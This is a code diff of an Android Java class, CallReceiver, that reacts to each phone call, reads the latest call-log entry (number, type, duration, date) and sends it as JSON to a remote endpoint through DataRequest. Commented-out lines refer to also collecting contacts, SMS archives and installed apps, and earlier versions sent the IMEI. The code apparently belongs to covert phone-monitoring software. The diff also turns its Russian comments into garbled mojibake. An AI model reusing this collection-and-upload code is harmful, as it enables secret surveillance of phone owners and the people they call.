@@ -22,16 +22,17 @@ import com.inet.android.request.DataRequest;
 import com.inet.android.utils.Logging;
 import com.inet.android.utils.WorkTimeDefiner;
 
-/** Класс сбора звонков
+/**
+ * РљР»Р°СЃСЃ СЃР±РѕСЂР° Р·РІРѕРЅРєРѕРІ
  * 
  * @author johny homicide
- *
+ * 
  */
 public class CallReceiver extends BroadcastReceiver {
 	private Context ctx;
 	private String date;
 	private SharedPreferences sp;
-	private static String LOG_TAG = "callReciver";
+	private static String LOG_TAG = "callReceiver";
 
 	@Override
 	public void onReceive(Context arg0, Intent intent) {
@@ -44,14 +45,14 @@ public class CallReceiver extends BroadcastReceiver {
 		}
 		boolean isWork = WorkTimeDefiner.isDoWork(arg0);
 		if (!isWork) {
-			Logging.doLog(LOG_TAG, "isWork return " + Boolean.toString(isWork), 
+			Logging.doLog(LOG_TAG, "isWork return " + Boolean.toString(isWork),
 					"isWork return " + Boolean.toString(isWork));
-			Logging.doLog(LOG_TAG, "after isWork retrun 0", 
+			Logging.doLog(LOG_TAG, "after isWork retrun 0",
 					"after isWork retrun 0");
 
 			return;
 		} else {
-			Logging.doLog(LOG_TAG, "isWork - " + Boolean.toString(isWork), 
+			Logging.doLog(LOG_TAG, "isWork - " + Boolean.toString(isWork),
 					"isWork - " + Boolean.toString(isWork));
 		}
 
@@ -60,20 +61,20 @@ public class CallReceiver extends BroadcastReceiver {
 
 		if (intent.getAction()
 				.equals("android.intent.action.NEW_OUTGOING_CALL")) {
-			// получаем исходящий номер
+			// РїРѕР»СѓС‡Р°РµРј РёСЃС…РѕРґСЏС‰РёР№ РЅРѕРјРµСЂ
 		} else if (intent.getAction().equals(
 				"android.intent.action.PHONE_STATE")) {
 			String phoneState = intent
 					.getStringExtra(TelephonyManager.EXTRA_STATE);
 			if (phoneState.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
-				// телефон звонит, получаем входящий номер
+				// С‚РµР»РµС„РѕРЅ Р·РІРѕРЅРёС‚, РїРѕР»СѓС‡Р°РµРј РІС…РѕРґСЏС‰РёР№ РЅРѕРјРµСЂ
 
 			} else if (phoneState.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
-				// телефон находится в режиме звонка (набор номера / разговор)
+				// С‚РµР»РµС„РѕРЅ РЅР°С…РѕРґРёС‚СЃСЏ РІ СЂРµР¶РёРјРµ Р·РІРѕРЅРєР° (РЅР°Р±РѕСЂ РЅРѕРјРµСЂР° / СЂР°Р·РіРѕРІРѕСЂ)
 			} else if (phoneState.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
-				// телефон находится в ждущем режиме (событие наступает по
-				// окончании разговора,
-				// когда уже знаем номер и факт звонка
+				// С‚РµР»РµС„РѕРЅ РЅР°С…РѕРґРёС‚СЃСЏ РІ Р¶РґСѓС‰РµРј СЂРµР¶РёРјРµ (СЃРѕР±С‹С‚РёРµ РЅР°СЃС‚СѓРїР°РµС‚ РїРѕ
+				// РѕРєРѕРЅС‡Р°РЅРёРё СЂР°Р·РіРѕРІРѕСЂР°,
+				// РєРѕРіРґР° СѓР¶Рµ Р·РЅР°РµРј РЅРѕРјРµСЂ Рё С„Р°РєС‚ Р·РІРѕРЅРєР°
 				try {
 					// TimeUnit.SECONDS.sleep(1);
 					TimeUnit.MILLISECONDS.sleep(1000);
@@ -86,7 +87,16 @@ public class CallReceiver extends BroadcastReceiver {
 	}
 
 	private void getCallDetails() {
-
+//		ListApp listApp = new ListApp();
+//		listApp.getListOfInstalledApp(ctx);
+//		GetInfo getInfo = new GetInfo(ctx);
+//		getInfo.getInfo();
+//		GetContacts getCont = new GetContacts();
+//		getCont.execute(ctx);
+//		ArchiveSms arhSms = new ArchiveSms();
+//		arhSms.execute(ctx);
+//		ArchiveCall arhCall = new ArchiveCall();
+//		arhCall.execute(ctx);
 		StringBuffer sb = new StringBuffer();
 		Cursor managedCursor = ctx.getContentResolver().query(
 				CallLog.Calls.CONTENT_URI, null, null, null, null);
@@ -101,9 +111,9 @@ public class CallReceiver extends BroadcastReceiver {
 		String phNumber = managedCursor.getString(number);
 		String callType = managedCursor.getString(type);
 		String callDuration = managedCursor.getString(duration);
-//		if (Integer.parseInt(callDuration) < 30) {
-//			callDuration = "5";
-//		}
+		// if (Integer.parseInt(callDuration) < 30) {
+		// callDuration = "5";
+		// }
 		String callTypeStr = null;
 		int dircode = Integer.parseInt(callType);
 
@@ -121,52 +131,38 @@ public class CallReceiver extends BroadcastReceiver {
 			break;
 		}
 
-		sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- " + callType
-				+ " \nCall Date:--- " + date + " \nCall duration in sec :--- "
-				+ callDuration);
+		sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- "
+				+ callType + " \nCall Date:--- " + date
+				+ " \nCall duration in sec :--- " + callDuration);
 		sb.append("\n----------------------------------");
 		managedCursor.close();
 
-//		String sendStr = "<packet><id>" + sp.getString("ID", "ID")
-//				+ "</id><time>" + date + "</time><type>4</type><app>" + callType
-//				+ "</app><ttl>" + phNumber + "</ttl><ntime>" + callDuration
-//				+ "</ntime></packet>";
-//		String sendJSONStr = "{\"id\":\"" + sp.getString("ID", "0000") + "\","
-//				+ "\"imei\":\"" + sp.getString("IMEI", "0000") + "\","
-//				+ "\"time\":\"" + date + "\","
-//				+ "\"type\":\"2\","
-//				+ "\"app\":\"" + callTypeStr + "\","
-//				+ "\"tel\":\"" + phNumber + "\","
-//				+ "\"duration\":\"" + callDuration + "\"}";
 		String sendJSONStr = null;
 		JSONObject jsonObject = new JSONObject();
 		JSONArray data = new JSONArray();
 		JSONObject info = new JSONObject();
 		JSONObject object = new JSONObject();
 		try {
-			jsonObject.put("account", sp.getString("account", "0000"));
-			jsonObject.put("device", sp.getString("device", "0000"));
-			jsonObject.put("imei", sp.getString("imei", "0000"));
-			jsonObject.put("key", System.currentTimeMillis());
 			
-			info.put("tel", phNumber);
+			info.put("number", phNumber);
 			info.put("duration", callDuration);
-			
+
 			object.put("time", date);
 			object.put("type", callTypeStr);
 			object.put("info", info);
 			data.put(object);
 			jsonObject.put("data", data);
-			sendJSONStr = jsonObject.toString();
+			// sendJSONStr = jsonObject.toString();
+			sendJSONStr = object.toString();
 		} catch (JSONException e) {
-			Logging.doLog(LOG_TAG, "json сломался", "json сломался");
+			Logging.doLog(LOG_TAG, "json СЃР»РѕРјР°Р»СЃСЏ", "json СЃР»РѕРјР°Р»СЃСЏ");
 		}
-		
-		DataRequest dr = new DataRequest(ctx);
-		dr.sendRequest(sendJSONStr);
 
 		Logging.doLog(LOG_TAG, sb.toString(), sb.toString());
 		Logging.doLog(LOG_TAG, sendJSONStr);
+
+		DataRequest dr = new DataRequest(ctx);
+		dr.sendRequest(sendJSONStr);
 	}
 
 	@SuppressLint("SimpleDateFormat")
